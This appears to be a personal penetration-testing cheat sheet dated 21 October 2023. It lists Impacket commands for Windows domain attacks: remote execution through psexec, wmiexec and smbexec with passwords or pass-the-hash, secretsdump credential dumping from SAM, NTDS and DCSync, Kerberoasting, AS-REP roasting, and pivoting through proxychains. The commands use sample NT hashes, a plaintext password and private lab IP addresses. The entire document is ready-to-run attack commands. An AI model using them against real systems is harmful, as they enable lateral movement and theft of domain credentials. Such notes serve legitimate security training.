### 21-Oct-23 Sat

```
impacket-psexec domain/username:'password'@IP
```

```
impacket-psexec username@ip -hashes LM:NT
```

```
impacket-wmiexec domain/username:'password'@IP
```

```
impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
```

```
impacket-smbexec domain/username:'password'@IP
```

```
impacket-secretsdump -sam sam -security security -system system LOCAL
```

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

```
impacket-GetUserSPNs -request -dc-ip $DomainIP $DomainName/$DomainUser
```

```
impacket-GetNPUsers -request -dc-ip $DomainIP $DomainName/$DomainUser
```

```
impacket-psexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
Administrator@192.168.50.212
```

```
proxychains -q impacket-psexec -hashes
00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
```

